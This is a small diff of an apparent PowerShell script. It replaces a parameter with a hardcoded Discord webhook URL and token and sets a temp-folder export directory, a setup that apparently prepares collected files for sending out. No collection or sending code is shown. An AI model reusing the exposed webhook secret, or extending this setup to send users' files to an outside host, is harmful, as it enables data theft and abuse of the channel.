@@ -1,6 +1,4 @@
-param (
-    [string]$whuri
-)
+$whuri = "https://discord.com/api/webhooks/1319433313802522704/tV7KSYG9jslRRv7zY2tB1A3g4z15FF-mhGbVfNSQluNdOiHRlGumuJqtdLcxxjRiKOSV"
 # Export-Verzeichnis
 $exportDir = "$env:temp\SomeStuff"
 
